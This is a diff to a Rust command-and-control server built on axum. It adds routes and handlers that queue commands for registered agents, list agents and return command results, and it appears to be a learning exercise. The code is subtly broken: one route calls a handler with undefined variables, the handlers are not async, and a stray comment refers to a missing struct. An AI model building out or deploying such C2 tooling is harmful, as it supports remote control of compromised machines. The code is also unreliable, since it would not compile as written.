@@ -14,6 +14,8 @@ use std::{
 
 use crate::models::*;
 
+// Add missing struct definition if not present in models.rs
+
 /// Start the C2 HTTP server
 pub async fn start_server() {
     // Create shared state that will be accessible to all handlers
@@ -24,6 +26,12 @@ pub async fn start_server() {
         .route("/api/register", post(handle_register))
         .route("/api/beacon", post(handle_beacon))
         .route("/api/result", post(handle_result))
+        .route("/api/command", post(handle_queue_command))
+        .route("/api/agents", get(handle_get_agents))
+        .route(
+            "/api/result/:id",
+            get(handle_get_results(state, command_id)),
+        )
         // TODO: Add more routes as you implement them
         // .route("/api/command", post(handle_queue_command))
         // .route("/api/agents", get(handle_list_agents))
@@ -169,16 +177,48 @@ pub fn queue_command(
     }
 }
 
-// pub fn handle_list_agent(){
+pub fn handle_queue_command(
+    State(state): State<SharedState>,
+    Json(req): Json<Command>,
+) -> Result<Json<CommandResult>, (StatusCode, String)> {
+    let mut state = state.lock().unwrap();
 
-// }
+    match queue_command(&mut state, req.agent_id, req.command_type, req.payload) {
+        Ok(command_id) => Ok(Json(CommandResult {
+            agent_id: req.agent_id,
+            output: "".to_string(),
+            timestamp: Utc::now(),
+            success: true,
+            command_id,
+        })),
+        Err(err) => Err((StatusCode::BAD_REQUEST, err)),
+    }
+}
 
 /// Get all registered agents
 pub fn get_agents(state: &AppState) -> Vec<Agent> {
     state.agents.values().cloned().collect()
 }
 
+pub fn handle_get_agents(State(state): State<SharedState>) -> Json<Vec<Agent>> {
+    let state = state.lock().unwrap();
+    let agents = get_agents(&state);
+    Json(agents)
+}
+
 /// Get result for a command
 pub fn get_result(state: &AppState, command_id: &str) -> Option<CommandResult> {
     state.results.get(command_id).cloned()
+}
+
+pub fn handle_get_results(
+    State(state): State<SharedState>,
+    command_id: String,
+) -> Result<Json<CommandResult>, (StatusCode, String)> {
+    let state = state.lock().unwrap();
+    if let Some(result) = get_result(&state, &command_id) {
+        Ok(Json(result))
+    } else {
+        Err((StatusCode::NOT_FOUND, "Result not found".to_string()))
+    }
 }
